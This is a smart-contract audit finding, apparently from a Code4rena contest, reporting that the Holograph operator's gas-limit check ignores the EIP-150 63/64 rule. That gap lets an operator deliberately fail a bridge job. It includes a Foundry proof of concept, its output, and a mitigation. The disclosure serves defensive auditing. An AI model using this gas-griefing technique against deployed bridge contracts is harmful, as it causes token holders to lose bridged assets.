## Tags

- bug
- 3 (High Risk)
- disagree with severity
- primary issue
- resolved
- sponsor confirmed
- selected for report
- responded

# [Gas limit check is inaccurate, leading to an operator being able to fail a job intentionally  ](https://github.com/code-423n4/2022-10-holograph-findings/issues/176) 

# Lines of code

https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/HolographOperator.sol#L316


# Vulnerability details

There's a check at line 316 that verifies that there's enough gas left to execute the `HolographBridge.bridgeInRequest()` with the `gasLimit` set by the user, however the actual amount of gas left during the call is less than that (mainly due to the 1/64 rule, see below).
An attacker can use that gap to fail the job while still having the `executeJob()` function complete.


## Impact
The owner of the bridged token would loose access to the token since the job failed.

## Proof of Concept
Besides using a few units of gas between the check and the actual call, there's also a rule that only 63/64 of the remaining gas would be dedicated to an (external) function call. Since there are 2 external function calls done (`nonRevertingBridgeCall()` and the actual call to the bridge) ~2/64 of the gas isn't sent to the bridge call and can be used after the bridge call runs out of gas.


The following PoC shows that if the amount of gas left before the call is at least 1 million then the execution can continue after the bridge call fails:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract ContractTest is Test {
    event FailedOperatorJob(bytes32 jobHash);
    uint256 private _inboundMessageCounter;
    mapping(bytes32 => bool) private _failedJobs;
    constructor(){
        _inboundMessageCounter = 5;
    }
    function testGas64() public {
        this.entryPoint{gas:1000000}();
    }

    Bridge bridge = new Bridge();
    event GasLeftAfterFail(uint left);

    function entryPoint() public {

        console2.log("Gas left before call: ", gasleft());

        bytes32 hash = 0x987744358512a04274ccfb3d9649da3c116cd6b19c535e633ef8529a80cb06a0;

        try this.intermediate(){
        }catch{
            // check out how much gas is left after the call to the bridge failed
            console2.log("Gas left after failure: ", gasleft());
            // simulate operations done after failure
            _failedJobs[hash] = true;
            emit FailedOperatorJob(hash);
        }
        ++_inboundMessageCounter;
        console2.log("Gas left at end: ", gasleft());

    }

    function intermediate() public{
        bridge.bridgeCall();
    }
}


contract Bridge{
    event Done(uint gasLeft);

    uint256[] myArr;

    function bridgeCall() public {
        for(uint i =1; i <= 100; i++){
            myArr.push(i);
        }
        // this line would never be reached, we'll be out of gas beforehand
        emit Done(gasleft());
    }
}

```

Output of PoC:
```
  Gas left before call:  999772
  Gas left after failure:  30672
  Gas left at end:  1628
```

Side note: due to some bug in forge `_inboundMessageCounter` would be considered warm even though it's not necessarily the case. However in a real world scenario we can warm it up if the selected operator is a contract and we'er using another operator contract to execute a job in the same tx beforehand. 

Reference for the 1/64 rule - [EIP-150](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-150.md). Also check out [evm.codes](https://www.evm.codes/#f1?fork=grayGlacier:~:text=From%20the%20Tangerine%20Whistle%20fork%2C%20gas%20is%20capped%20at%20all%20but%20one%2064th%20(remaining_gas%20/%2064)%20of%20the%20remaining%20gas%20of%20the%20current%20context.%20If%20a%20call%20tries%20to%20send%20more%2C%20the%20gas%20is%20changed%20to%20match%20the%20maximum%20allowed.).


## Recommended Mitigation Steps
Modify the required amount of gas left to gasLimit + any amount of gas spent before reaching the `call()`, then multiply it by 32/30 to mitigate the 1/64 rule (+ some margin of safety maybe).